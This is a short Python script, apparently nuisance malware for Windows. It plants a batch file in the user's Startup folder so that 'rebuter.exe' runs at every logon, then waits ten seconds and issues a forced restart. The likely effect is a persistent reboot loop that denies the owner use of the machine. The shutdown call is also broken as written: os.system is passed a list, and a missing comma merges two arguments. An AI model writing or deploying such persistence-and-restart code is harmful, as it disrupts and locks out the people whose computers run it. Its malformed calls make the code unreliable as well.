import time
import os
import getpass
USER_NAME = getpass.getuser()


def add_to_startup():
    file_path = (os.path.dirname(os.path.realpath(__file__)) + '\\rebuter.exe')
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+", encoding="utf-8") as bat_file:
        bat_file.write(r'start "" %s' % file_path)
    

if 'open.bat' not in os.listdir(r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME):
    add_to_startup()

time.sleep(10)
os.system(['shutdown', '-r' '-t' ,'0'])